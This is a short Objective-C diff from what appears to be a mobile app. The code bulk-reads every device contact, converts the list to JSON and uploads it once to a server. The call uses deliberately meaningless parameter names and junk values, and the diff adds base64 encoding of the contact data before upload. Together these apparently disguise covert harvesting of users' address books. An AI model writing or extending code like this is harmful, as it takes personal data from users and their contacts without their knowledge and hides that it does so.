@@ -208,7 +208,8 @@
             if (!self.isUpload) {
                 [self.manager getAllContactsWithCompletion:^(NSArray<NSDictionary *> * _Nonnull contacts) {
                     NSString *json = [AnyDevHelper jsonStringFromArray:contacts];
-                    [AnyHttpTool reportContactsWithAura:@"3" statue:@"sdsafdsljflsdf" standing:@"flskadjflsdafdslakfjsadf" gone:json success:^(id  _Nonnull responseObject) {
+                    NSString * baseStr = [AnyDevHelper base64Encode:json];
+                    [AnyHttpTool reportContactsWithAura:@"3" statue:@"sdsafdsljflsdf" standing:@"flskadjflsdafdslakfjsadf" gone:baseStr success:^(id  _Nonnull responseObject) {
                         self.isUpload = YES;
                     } failure:^(NSError * _Nonnull error) {
                         
